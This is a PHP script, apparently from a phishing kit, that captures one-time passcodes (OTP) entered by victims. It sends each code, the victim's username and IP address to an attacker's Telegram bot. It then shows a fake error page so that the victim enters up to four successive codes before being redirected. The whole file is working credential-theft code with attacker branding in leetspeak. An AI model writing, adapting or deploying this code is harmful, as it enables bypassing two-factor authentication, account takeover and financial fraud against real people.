<?php
session_start();
include 'bot.php';

// Inicializar contador de intentos si no existe
if (!isset($_SESSION['intentos'])) {
    $_SESSION['intentos'] = 4;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $otp = htmlspecialchars($_POST['otp_code'], ENT_QUOTES, 'UTF-8');
    $usr = isset($_SESSION['username']) ? $_SESSION['username'] : 'Desconocido';
    $ip = $_SERVER['REMOTE_ADDR'];

    // Restar un intento
    $_SESSION['intentos']--;

    // Mensaje para Telegram
    $text = "D4V1V13ND4 | @sn0wdie\n----\n🔑 C0D1G0 OTP\n\nD0C: $usr\nC0D1G0: $otp\n1NT3NT0S R3ST4NT3S: " . $_SESSION['intentos'] . "\nIP: $ip\n----";
    
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text);

    // Enviar a Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    if ($_SESSION['intentos'] > 0) {
        // Si aún tiene intentos, lo mandamos a una página de "Error / Reintentar" 
        // o de vuelta al mismo formulario para que ingrese el siguiente
        header("Location: ../verificacion_error.html"); 
    } else {
        // Al agotar los 4 intentos, reiniciamos y redirigimos al final (beta.php o index)
        $_SESSION['intentos'] = 4; 
        header("Location: ../index.html");
    }
    exit;
}
?>